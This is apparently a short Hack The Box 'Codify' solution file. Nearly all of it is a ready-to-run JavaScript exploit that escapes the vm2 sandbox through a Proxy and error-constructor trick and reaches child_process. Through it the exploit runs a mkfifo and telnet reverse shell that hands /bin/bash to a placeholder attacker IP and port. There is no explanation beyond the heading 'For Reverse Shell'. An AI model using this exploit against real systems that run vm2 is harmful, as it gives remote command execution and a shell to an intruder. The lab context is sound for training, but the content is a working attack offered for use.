# codify-HTB-solution
For Reverse Shell

'''
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync("TF=$(mktemp -u);mkfifo $TF && telnet $YOUR_IP $PORT 0<$TF | /bin/bash 1>$TF");
}
`

console.log(vm.run(code));
'''
